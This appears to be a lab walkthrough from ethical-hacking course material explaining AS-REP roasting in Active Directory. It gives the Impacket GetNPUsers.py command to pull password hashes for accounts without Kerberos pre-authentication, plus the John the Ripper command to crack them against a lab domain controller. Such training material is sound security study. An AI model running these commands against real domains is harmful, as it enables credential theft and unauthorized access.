
An AS-REP roasting attack targets user accounts in AD that do not require Kerberos pre-authentication, exploiting the DONT_REQ_PREAUTH setting. Attackers can request a ticket-granting ticket (TGT) for these accounts without needing the user's password.

The DC responds with an encrypted TGT, which the attacker captures. This TGT, encrypted with the user's password hash, is then subjected to offline password-cracking tools such as Hashcat or John the Ripper. By rapidly guessing the password, the attacker can eventually decrypt the TGT, revealing the user's password

In Parrot Security machine, open a new **Terminal** window and execute **sudo su** to run the programs as a root user (When prompted, enter the password **toor**)

Now, run the **cd** command to jump to the root directory

Type **cd impacket/examples/** and press **Enter** to move into the examples directory

Execute the command **python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22**

**GetNPUsers.py**: Python script to retrieve AD user information
**CEH.com/**: Target AD domain
**-no-pass**: Flag to find user accounts not requiring pre-authentication
**-usersfile** ~/ADtools/users.txt: Path to the file with the user account list
-**dc-ip 10.10.1.22**: IP address of the DC to query

We can observe that the user **Joshua** has **DONT_REQUIRE_PREAUTH** set. As this user is vulnerable to AS-REP roasting, we obtain Joshua's password hash

Copy that hash and save it as **joshuahash.txt**. Execute the command **echo '[HASH]' > joshuahash.txt**

Execute the command **john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt**. This will crack the password hash and will give us the password in plain text

